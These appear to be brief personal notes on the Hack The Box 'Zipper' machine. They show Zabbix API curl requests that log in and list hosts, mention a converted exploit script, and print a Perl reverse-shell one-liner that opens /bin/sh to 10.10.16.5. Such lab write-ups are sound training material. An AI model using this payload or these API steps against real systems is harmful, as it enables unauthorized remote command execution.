### writeups
* https://0xrick.github.io/hack-the-box/zipper/
* https://0xdf.gitlab.io/2019/02/23/htb-zipper.html#

### Zabbix API
##### POST api_jsonrpc.php
```bash login to get token, id doesn't matter
❯ curl -X POST -H 'Content-type:application/json' -d '{"jsonrpc":"2.0","method":"user.login","params":{"user":"zapper","password":"zapper"},"auth":null,"id":13}' http://$IP/zabbix/api_jsonrpc.php
{"jsonrpc":"2.0","result":"938bc25389fc5d728f00f2557bd053e7","id":13}
```

```bash Get Host Info
❯ curl -X POST -H 'Content-type:application/json' -d '{"jsonrpc":"2.0","method":"host.get","id":13,"auth":"938bc25389fc5d728f00f2557bd053e7","params":{}}' http://$IP/zabbix/api_jsonrpc.php | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1638  100  1539  100    99   2590    166 --:--:-- --:--:-- --:--:--  2757
{
  "jsonrpc": "2.0",
  "result": [
    {
      "hostid": "10105", <- This is the one not available
      "available": "0",
      "proxy_hostid": "0",
      "host": "Zabbix",
      "status": "0",
      "disable_until": "0",
      "<snip>":"..."
      "tls_subject": "",
      "tls_psk_identity": "",
      "tls_psk": ""
    },
    {
      "hostid": "10106",
      "available": "1", <- This is the one available
      "proxy_hostid": "0",
      "host": "Zipper",
      "<snip>":"..."
      "tls_psk": ""
    }
  ],
  "id": 13
}
```

### exploit.py
I converted `39937.py` to fit in python3.

##### Payload has to be a quite strick perl socket
Otherwise will disconnect instantly.

```bash payload
[zabbix_cmd]>>: perl -e 'use Socket;$i="10.10.16.5";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Root by abuse non absolute path Environment variables
* https://github.com/A1vinSmith/OSCP-PWK/wiki/Linux-Privilege-Escalation#missing-part-from-the-above-lab-environment-variables-after-found-an-exploitable-suid-binary